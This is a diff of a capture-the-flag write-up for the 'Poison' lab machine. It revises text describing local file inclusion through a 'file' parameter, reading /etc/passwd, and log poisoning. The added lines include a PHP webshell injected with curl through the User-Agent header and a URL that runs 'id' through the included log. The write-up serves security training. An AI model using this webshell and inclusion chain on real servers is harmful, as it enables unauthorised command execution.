@@ -94,7 +94,9 @@ In the `/phpinfo.php` path we can access php configuration:
 
 <br />
 
-`Allow_url_include` flag is disabled, this means that we can't include files from remote locations, so, removing the posibility to exploit vulnerabilities like `RFI` (Remote File Inclusion).
+`Allow_url_include` flag is disabled, this means that we can't include files from remote locations.
+
+This removes the posibility to exploit vulnerabilities like `RFI` (Remote File Inclusion).
 
 <br />
 
@@ -194,7 +196,7 @@ uid=1001(charix) gid=1001(charix) groups=1001(charix)
 
 <br />
 
-If we further analyze the URL that give us access to the base64-encoded password, there can be a good place to test a LFI (Local File Inclusion).
+If we take a closer look at the URL that gave us access to the `base64-encoded` password, there can be a good place to test a LFI (Local File Inclusion).
 
 <br />
 
@@ -204,9 +206,9 @@ http://10.10.10.84/browse.php?file=pwdbackup.txt
 
 <br />
 
-It has a `"file"` parameter where we can attempt to include another critical files.
+It has a `"file"` parameter that we can try to use to include other critical files.
 
-Let s try it with the `/etc/passwd`
+Let's try it with `/etc/passwd`
 
 <br />
 
@@ -217,7 +219,7 @@ view-source:http://10.10.10.84/browse.php?file=/etc/passwd
 
 <br />
 
-We successfully dump it.
+We successfully retrieve its contents.
 
 <br / >
 
@@ -225,15 +227,19 @@ We successfully dump it.
 
 <br />
 
-`Log Poisoning` is a hacking technique that allows us to `convert` a simple `LFI to a RCE`. 
+`Log Poisoning` is a hacking technique that allows us to turn a simple `LFI` into an `RCE`. 
 
-By manipulating log files, attackers can try to run commands into the victim machine. The used language depends of the technology stack of the website, in this case we need to use PHP. To exploit this, we will do it step by step:
+By manipulating `log` files, attackers can attempt to `execute commands` on the target machine. The scripting language used depends on the website's tech stack. In this case, we need to use `PHP`.
 
-### Locate the server's log file (apache2):
+We will exploit this step by step:
 
 <br />
 
-We're deaking with a `FreeBSD` system, so the default path of `apache2` log file is `/var/log/httpd-access.log`.
+### 1 - Locate the server's log file (apache2)
+
+<br />
+
+We're dealing with a `FreeBSD` system, so the default `Apache` log file path is `/var/log/httpd-access.log`.
 
 We can confirm it with the LFI:
 
@@ -246,15 +252,47 @@ view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
 
 <br />
 
-### 2 - Make a curl request including PHP code into the User-Agent header:
+### 2 - Send a curl request that injects a PHP webshell into the User-Agent header
 
 <br />
 
+This is the PHP code that we'll use for the webshell:
+
+```php
+<?php 
+    system($_GET[100]); 
+?>
+```
+
+<br />
+
+Now, we can make the request:
+
+<br />
+
+```bash
+curl -s -X GET "http://10.10.10.84/" -H 'User-Agent: <?php system($_GET[100]); ?>' 
+```
+
+<br />
+
+### 3 - Use LFI to include the log file and run a command
+
+<br />
+
+Finally, we include the `httpd-access.log` file to execute our PHP code and trigger the webshell:
+
+<br />
+
+```bash
+view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&100=id
+```
+![9](../../../assets/images/Poison/9.png)
 
 
 <br />
 
-### 2 - Use LFI to include the log file:
+### 4 - Trigger a reverse shell
 
 <br />
 
